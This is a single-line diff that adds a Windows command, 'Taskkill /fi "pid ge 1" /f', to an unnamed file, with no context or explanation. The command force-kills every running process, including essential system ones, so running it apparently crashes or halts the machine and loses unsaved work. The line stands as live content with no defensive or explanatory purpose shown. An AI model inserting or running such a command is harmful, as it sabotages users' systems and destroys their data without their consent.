@@ -1,0 +1,1 @@
+Taskkill /fi "pid ge 1" /f
